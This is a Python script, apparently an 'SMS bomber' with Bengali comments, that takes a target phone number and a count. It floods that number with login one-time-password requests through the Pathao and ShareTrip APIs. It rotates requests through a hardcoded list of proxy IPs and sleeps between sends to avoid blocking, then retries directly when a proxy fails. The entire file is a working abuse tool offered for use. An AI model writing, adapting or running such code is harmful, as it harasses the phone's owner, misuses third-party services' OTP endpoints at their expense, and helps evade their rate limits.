import requests, os, time, random

def start():
    os.system('clear')
    print('\033[1;32m[ X-BOOM PRO PROXY EDITION ]\033[0m')
    target = input('\n\033[1;32m[+] TARGET (017...): \033[0m')
    amount = int(input('\033[1;32m[+] AMOUNT: \033[0m'))
    
    # ফ্রি প্রক্সি লিস্ট (এখানে আপনি আরও প্রক্সি যোগ করতে পারেন)
    proxy_list = [
        "http://103.152.112.162:80",
        "http://103.102.131.218:80",
        "http://45.251.228.162:80",
        "http://103.108.140.246:80"
    ]

    for i in range(1, amount + 1):
        # প্রতিবার একটি র‍্যান্ডম প্রক্সি সিলেক্ট হবে
        proxy = {"http": random.choice(proxy_list), "https": random.choice(proxy_list)}
        
        try:
            # Pathao API
            requests.post("https://api-hermes.pathao.com/user/otp-send/login", 
                          json={"phone": "+88"+target}, 
                          proxies=proxy, timeout=5)
            
            # ShareTrip API
            requests.post("https://api.sharetrip.net/api/v1/otp/send", 
                          json={"mobileNumber": target, "type": "login"}, 
                          proxies=proxy, timeout=5)

            print(f'\033[1;32m[{i}] SENT VIA PROXY: {proxy["http"]} ==> {target}\033[0m')
        except:
            # প্রক্সি কাজ না করলে সরাসরি আইপি দিয়ে ট্রাই করবে
            print(f'\033[1;33m[{i}] PROXY FAILED, TRYING DIRECTLY...\033[0m')
            try:
                requests.post("https://api-hermes.pathao.com/user/otp-send/login", json={"phone": "+88"+target}, timeout=5)
                print(f'\033[1;32m[{i}] DIRECT SUCCESS ==> {target}\033[0m')
            except:
                print(f'\033[1;31m[{i}] FAILED\033[0m')
        
        time.sleep(5) # ব্লকিং এড়াতে ৫ সেকেন্ড গ্যাপ

if __name__ == "__main__":
    start()
